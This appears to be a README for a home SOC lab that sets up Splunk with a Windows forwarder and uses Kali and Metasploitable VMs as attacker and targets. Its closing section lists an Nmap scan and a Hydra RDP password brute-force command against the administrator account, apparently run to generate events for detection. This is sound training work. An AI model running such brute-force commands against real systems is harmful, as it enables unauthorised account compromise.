# Lab Topology

## Virtual Machines

| VM | OS | Role |
|----|----|------|
| Ubuntu Server | Ubuntu 22.04 | Splunk Enterprise (SIEM) |
| Windows 10 | Windows 10 22H2 | Target machine + Universal Forwarder |
| Kali Linux | Kali 2024 | Attacker machine |
| Metasploitable2 | Linux | Vulnerable Linux target |

## Network

- Type: NAT Network (VMware)
- All VMs on same subnet: `192.168.23.0/24`

## Splunk Configuration

- Splunk Web UI: `http://<ubuntu-ip>:8000`
- Receiving port (forwarder data): TCP 9997
- Receiving port (syslog): UDP 514
- Index used: `main`
- Forwarder host name: `win-ad`

## Forwarder Configuration Files

**inputs.conf** — monitors Windows Security Event Log
```ini
[WinEventLog://Security]
disabled = false
index = main
```

**outputs.conf** — forwards data to Splunk indexer
```ini
[tcpout]
defaultGroup = default-autolb-group

[tcpout:default-autolb-group]
server = <ubuntu-ip>:9997
```

## Tools Used

- Splunk Enterprise 10.4
- Splunk Universal Forwarder
- Nmap 7.99
- Hydra v9.7
- Metasploit Framework (optional / lab completeness)

## Attack Commands Used

**Nmap reconnaissance:**
```bash
nmap -sS -A 192.168.23.129
```

**Hydra RDP brute force:**
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
  rdp://192.168.23.129 -t 4 -V -f
```
